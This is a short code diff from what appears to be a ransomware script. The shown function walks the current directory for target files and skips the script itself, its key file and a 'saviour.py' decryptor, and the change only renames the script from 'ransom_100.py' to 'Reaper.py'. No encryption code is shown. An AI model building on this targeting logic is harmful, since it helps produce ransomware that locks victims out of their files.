@@ -11,7 +11,7 @@ def get_key():
 
 def gather_targets():
     for file in os.listdir():
-        if file == "ransom_100.py" or file == "key.key" or file == "saviour.py":
+        if file == "Reaper.py" or file == "key.key" or file == "saviour.py":
             continue
 
         if os.path.isdir(file):
